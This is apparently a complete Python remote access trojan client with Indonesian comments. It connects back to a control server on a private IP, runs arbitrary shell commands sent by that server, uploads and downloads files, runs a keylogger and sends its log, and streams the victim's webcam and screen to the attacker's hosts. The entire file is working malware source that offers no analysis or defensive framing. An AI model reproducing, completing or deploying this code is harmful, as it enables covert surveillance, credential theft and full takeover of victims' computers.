import socket
import subprocess
import json
import os
import threading
from logger import KeyLogger  # type: ignore
import cv2
import pickle
import struct
import pyautogui
from PIL import ImageGrab
import numpy as np

# Inisialisasi koneksi ke server
sc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
    sc.connect(('192.168.95.4', 9999))
except socket.error as e:
    print(f"Gagal terhubung ke server: {e}")
    exit()

# Buat satu instance KeyLogger
keylogger = KeyLogger()

def menerima_perintah():
    data = b''
    while True:
        try:
            potongan = sc.recv(1024)
            if not potongan:
                break
            data += potongan
            return json.loads(data.decode(errors='ignore'))
        except json.JSONDecodeError:
            pass  # Tunggu sampai data lengkap
        except socket.error:
            break
    return None

def upload_file(namafile):
    try:
        with open(namafile, 'rb') as file:
            sc.send(json.dumps({"size": os.path.getsize(namafile)}).encode())
            sc.send(file.read())
    except FileNotFoundError:
        sc.send(json.dumps({"error": f"File {namafile} tidak ditemukan"}).encode())

def download_file(namafile):
    with open(namafile, 'wb') as file:
        try:
            sc.settimeout(2)
            file_size = json.loads(sc.recv(1024).decode()).get("size", 0)
            received = 0
            while received < file_size:
                _file = sc.recv(1024)
                if not _file:
                    break
                file.write(_file)
                received += len(_file)
            sc.settimeout(None)
        except socket.timeout:
            print("Timeout saat menerima file")

def open_log():
    sc.send(keylogger.read_log().encode())

def log_thread():
    threading.Thread(target=open_log, daemon=True).start()

def byte_stream():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        sock.connect(('192.168.95.4', 9998))
        vid = cv2.VideoCapture(0)
        if not vid.isOpened():
            vid = cv2.VideoCapture(1)  # Coba kamera lain jika gagal
        if not vid.isOpened():
            print("Gagal membuka kamera pada kedua percobaan.")
            return
        
        while vid.isOpened():
            success, frame = vid.read()
            if not success:
                print("Gagal membaca frame dari kamera.")
                break
            frame = cv2.resize(frame, (640, 480))
            data = pickle.dumps(frame)
            message = struct.pack("Q", len(data)) + data
            sock.sendall(message)
    except (socket.error, BrokenPipeError) as e:
        print(f"Kesalahan koneksi: {e}")
    finally:
        vid.release()
        sock.close()

def kirim_byte_stream():
    threading.Thread(target=byte_stream, daemon=True).start()

def byte_stream_recorder():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        sock.connect(('192.168.94.97', 9997))
        while True:
            img = ImageGrab.grab()
            frame = np.array(img)
            frame = cv2.cvtColor(frame, cv2.COLOR_RGB2BGR)
            data = pickle.dumps(frame)
            message = struct.pack("i", len(data)) + data
            sock.sendall(message)
    except (socket.error, BrokenPipeError) as e:
        print(f"Kesalahan koneksi: {e}")
    finally:
        sock.close()

def kirim_byte_stream_recorder():
    threading.Thread(target=byte_stream_recorder, daemon=True).start()

def jalankan_perintah():
    while True:
        perintah = menerima_perintah()
        if not perintah:
            continue
        
        hasil = ""
        
        if perintah in ('exit', 'quit'):
            break
        elif perintah.startswith('cd '):
            try:
                os.chdir(perintah[3:])
                hasil = "Changed directory to " + os.getcwd()
            except FileNotFoundError:
                hasil = "Directory not found"
        elif perintah.startswith('download '):
            upload_file(perintah[9:])
            continue
        elif perintah.startswith('upload '):
            download_file(perintah[7:])
            continue
        elif perintah == 'start_logger':
            keylogger.start_logger()
        elif perintah == 'baca_data':
            log_thread()
        elif perintah == 'stop_logger':
            keylogger.stop_listener()
        elif perintah == 'start_cam':
            kirim_byte_stream()
        elif perintah.startswith('screen_shot'):
            ss = pyautogui.screenshot()
            ss.save('ss.png')
            upload_file('ss.png')
        elif perintah.startswith('screen_share'):
            kirim_byte_stream_recorder()
        else:
            try:
                execute = subprocess.Popen(
                    perintah,
                    shell=True,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    stdin=subprocess.PIPE
                )
                hasil = execute.stdout.read() + execute.stderr.read()
                hasil = hasil.decode()
            except Exception as e:
                hasil = f"Error menjalankan perintah: {e}"
        
        output = json.dumps(hasil)
        sc.send(output.encode())

jalankan_perintah()